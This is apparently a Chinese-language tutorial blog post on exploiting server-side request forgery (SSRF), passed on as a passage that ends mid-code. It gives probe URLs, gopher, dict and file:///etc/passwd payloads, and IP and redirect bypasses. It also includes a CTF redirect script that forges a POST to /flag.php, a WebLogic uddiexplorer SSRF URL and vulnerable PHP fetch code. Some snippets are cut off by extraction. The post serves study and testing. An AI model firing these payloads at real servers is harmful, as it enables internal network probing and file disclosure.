## SSRF在有无回显方面的利用及其思考与总结
​ 对于SSRF的利用、危害及绕过[MisakiKata
]师傅先知上的的[一文](https://xz.aliyun.com/t/6235)介绍的非常详细，看了这篇文章也学到了很多。由于在实际场景中还遇到很多类似SSRF的点，所以还想深入探讨一下其他利用方式以及无回显情况下的SSRF。
### 1.一般层面（有回显）SSRF及bypass利用技巧
可能存在SSRF的URL:
    http://www.xxx.com/vul.php?url=http://www.xxc.com/xxx.jpg
    http://share.xxx.com/index.php?url=http://test.com
测试
    http://www.xxx.com/vul.php?url=http://127.0.0.1:port
根据回显内容和状态即可确定漏洞是否存在。
协议利用
    gopher
    http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test
    dict
    http://4o4notfound.org/ssrf.php?url=dict://127.0.0.1:port/info
    file
    http://4o4notfound.org/ssrf.php?url=file:///etc/passwd
    http
    http://4o4notfound.org/ssrf.php?url=http://xxx.com/302.php
协议限制为http下向服务端提交
#### **bypass**
  * IP限制绕过（xip.io,十进制IP,八进制IP）
  * 协议限制绕过（Redirect,CRLF header injection）
  * 调用系统支持的协议和方法
辅助脚本302.php----bypass http协议限制
协议利用：
1)Dict协议
`/302.php?s=dict&ip=vul.comg&port=8080&data=helo:dict`
2)Gopher协议
`/302.php?s=gopher&ip=vul.comg&port=8080&data=gopher`
3)file协议
例子：只能本地localhost情况下访问
结合一道CTF实例
302.php的内容为
    header("Location:gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1%0d%0aHost:
    vultarget.com%0d%0aUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0)
    Gecko/20100101 Firefox/50.0%0d%0aAccept:
    text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8%0d%0aAccept-Language:
    zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3%0d%0aAccept-Encoding: gzip,
    deflate%0d%0aConnection: keep-alive%0d%0aUpgrade-Insecure-Requests: 1%0d%0aContent-    
    Type: application/x-www-form-urlencoded%0d%0aContent-Length:
    14%0d%0a%0d%0ausername=admin");
CRLF Header Injection HTTP头注入
weblogic uddiexplorer SSRF
    http://xxx.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://(要探测的内网地址)&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
CRLF->ASCII Code
`-%0d->0x0d->\r 回车`
`-%0a->0x0a->\n 换行`
案例一
案例二
#### **其他实例**
下面列出的代码的是从现实场景开发中找到的几个较常见不安全的的实实列。通过用户提供的URL来获取文件的PHP代码 ，只要它们允许用户决定从哪里获取数据即可 。
  1. PHP file_get_contents
    "; 
        } 
        echo $img; 
    ?>
此实现使用`file_get_contents`PHP函数提取用户请求的数据（在本例中为图像），并将其保存到磁盘上随机生成的文件名的文件中。然后，HTML
img属性将图像显示给用户，$content可以由用户控制。
  1. PHP fsockopen（）函数
函数实现的是使用`fsockopen`PHP函数按用户（任何文件或HTML）的请求获取数据。此函数建立与服务器上的套接字的TCP连接，并执行原始数据传输。
3.PHP curl_exec（）函数
这是在开发中另一个非常常见的操作，它使用`cURL`PHP
获取数据。文件/数据被下载并存储到'curled'文件夹下的磁盘中，并附加一个随机数和'.txt'文件扩展名。
以下是从某网站检索robots.txt的上述代码对应的示列
原本请求 **http：//www.example.com/robots.txt**
但是请求 **http：//127.0.0.1：3306 / test.txt** ，得到如下回显
#### **利用技巧**
端口扫描：
1）PHP
可以滥用以下cURL实现来端口扫描设备：
    <?php 
        if (isset($_POST['url']))
        {
            $link = $_POST['url'];